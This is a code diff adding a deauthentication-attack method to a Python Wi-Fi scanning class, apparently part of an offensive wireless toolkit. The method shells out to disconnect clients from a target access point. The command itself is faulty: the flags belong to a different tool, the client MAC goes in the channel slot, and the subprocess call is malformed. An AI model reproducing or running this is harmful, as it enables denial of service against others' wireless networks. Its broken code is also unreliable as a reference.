@@ -32,7 +32,24 @@ class AirodumpScanner:
     @staticmethod
     def get_networks_in_range(interface):
         logging.info(f"Starting airodump scan on interface {interface}...")
-           # Placeholder for logic to perform airodump scanning    
+        # Placeholder for logic to perform airodump scanning    
         scanned_networks = AirodumpScanner._sniff(interface)
         logging.info(f"Airodump scan completed. Found {len(scanned_networks)} networks.")
         return scanned_networks
+    
+    
+    def perform_deauth_attack(target_bssid, target_client_mac=None, attack_duration=60, interface=None)->bool:
+        
+        if not interface:
+            logging.error("No interface specified for deauth attack.")
+            raise ValueError("Interface is required for deauth attack.")
+        
+        try:
+            logging.info(f"Initiating deauth attack on BSSID {target_bssid} for {attack_duration} seconds.")
+            subprocess.run(f"timeout {attack_duration}s airodump-ng --deauth 0 -a {target_bssid} -c {target_client_mac} {interface}" , shell=False )        
+            logging.info("Deauth attack is started.")         
+            return True
+        
+        except Exception as e:
+            logging.error(f"Error during deauth attack: {e}")
+            raise e
